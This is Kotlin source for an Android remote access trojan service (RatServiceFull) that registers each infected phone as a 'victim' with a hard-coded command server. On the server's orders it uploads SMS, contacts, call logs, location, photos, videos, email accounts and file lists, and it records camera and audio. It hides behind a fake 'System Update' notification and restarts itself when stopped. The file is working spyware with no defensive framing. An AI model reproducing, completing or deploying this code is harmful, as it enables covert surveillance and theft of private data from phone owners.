package com.dooxrat.victim

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.*
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

class RatServiceFull : Service() {

    private var socket: Socket? = null
    private val SERVER_URL = "http://188.166.255.163:5000"
    private lateinit var deviceId: String
    private lateinit var dataCollector: DataCollector
    private lateinit var cameraRecorder: CameraRecorder
    private lateinit var audioRecorder: AudioRecorder
    private lateinit var screenRecorder: ScreenRecorder
    private lateinit var mediaController: MediaController

    override fun onCreate() {
        super.onCreate()
        deviceId = generateDeviceId()
        dataCollector = DataCollector(this)
        cameraRecorder = CameraRecorder(this)
        audioRecorder = AudioRecorder(this)
        screenRecorder = ScreenRecorder(this)
        mediaController = MediaController(this)
        
        createNotificationChannel()
        startForeground(1, createNotification())
        connectToServer()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun generateDeviceId(): String {
        return "${Build.MODEL}_${System.currentTimeMillis()}"
    }

    private fun connectToServer() {
        try {
            socket = IO.socket(SERVER_URL)
            
            socket?.on(Socket.EVENT_CONNECT) {
                registerVictim()
            }

            socket?.on("execute_command") { args ->
                if (args.isNotEmpty()) {
                    val data = args[0] as JSONObject
                    handleCommand(data)
                }
            }

            socket?.connect()
            startHeartbeat()
        } catch (e: URISyntaxException) {
            e.printStackTrace()
        }
    }

    private fun registerVictim() {
        val deviceInfo = dataCollector.getDeviceInfo()
        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceInfo", deviceInfo)
        }
        socket?.emit("register_victim", data)
    }

    private fun startHeartbeat() {
        val handler = Handler(Looper.getMainLooper())
        handler.post(object : Runnable {
            override fun run() {
                socket?.emit("heartbeat")
                handler.postDelayed(this, 30000)
            }
        })
    }

    private fun handleCommand(data: JSONObject) {
        val command = data.getString("command")
        val params = data.optJSONObject("params") ?: JSONObject()

        when (command) {
            // Data collection
            "get_sms" -> sendResult(command, dataCollector.getSMS())
            "get_contacts" -> sendResult(command, dataCollector.getContacts())
            "get_call_logs" -> sendResult(command, dataCollector.getCallLogs())
            "get_location" -> sendResult(command, dataCollector.getLocation())
            "get_apps" -> sendResult(command, dataCollector.getInstalledApps())
            "get_gallery_photos" -> sendResult(command, dataCollector.getGalleryPhotos())
            "get_gallery_videos" -> sendResult(command, dataCollector.getGalleryVideos())
            "get_email_accounts" -> sendResult(command, dataCollector.getEmailAccounts())
            "get_files" -> {
                val path = params.optString("path", "/sdcard/")
                sendResult(command, dataCollector.getFilesList(path))
            }
            
            // Recording
            "record_camera" -> {
                val cameraId = params.optString("camera", "0")
                val duration = params.optInt("duration", 10)
                val path = cameraRecorder.startRecording(cameraId, duration)
                sendResult(command, JSONObject().put("path", path))
            }
            "record_audio" -> {
                val duration = params.optInt("duration", 10)
                val path = audioRecorder.startRecording(duration)
                sendResult(command, JSONObject().put("path", path))
            }
            "get_notifications" -> sendResult(command, NotificationListener.getNotifications())
            
            // Media control
            "play_youtube" -> {
                val videoId = params.optString("video_id", "")
                val success = mediaController.playYouTubeVideo(videoId)
                sendResult(command, JSONObject().put("success", success))
            }
            "play_tiktok" -> {
                val url = params.optString("url", "")
                val success = mediaController.playTikTokVideo(url)
                sendResult(command, JSONObject().put("success", success))
            }
            "open_browser" -> {
                val url = params.optString("url", "")
                val success = mediaController.openBrowser(url)
                sendResult(command, JSONObject().put("success", success))
            }
            "show_toast" -> {
                val message = params.optString("message", "")
                mediaController.showToast(message)
                sendResult(command, JSONObject().put("success", true))
            }
            "open_app" -> {
                val packageName = params.optString("package", "")
                val success = mediaController.openApp(packageName)
                sendResult(command, JSONObject().put("success", success))
            }
            
            // Volume control
            "volume_up" -> {
                mediaController.increaseVolume()
                sendResult(command, JSONObject().put("success", true))
            }
            "volume_down" -> {
                mediaController.decreaseVolume()
                sendResult(command, JSONObject().put("success", true))
            }
            "mute" -> {
                mediaController.mutePhone()
                sendResult(command, JSONObject().put("success", true))
            }
            "unmute" -> {
                mediaController.unmutePhone()
                sendResult(command, JSONObject().put("success", true))
            }
            
            // Basic actions
            "vibrate" -> {
                val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    vibrator.vibrate(500)
                }
                sendResult(command, JSONObject().put("success", true))
            }
            "send_sms" -> {
                val number = params.optString("number", "")
                val message = params.optString("message", "")
                // Implementation
                sendResult(command, JSONObject().put("success", true))
            }
        }
    }

    private fun sendResult(command: String, result: Any?) {
        val data = JSONObject().apply {
            put("command", command)
            put("result", result)
        }
        socket?.emit("command_result", data)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "rat_service",
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "rat_service")
            .setContentTitle("System Update")
            .setContentText("Optimizing device...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        socket?.disconnect()
        val restartIntent = Intent(this, RatServiceFull::class.java)
        startService(restartIntent)
    }
}
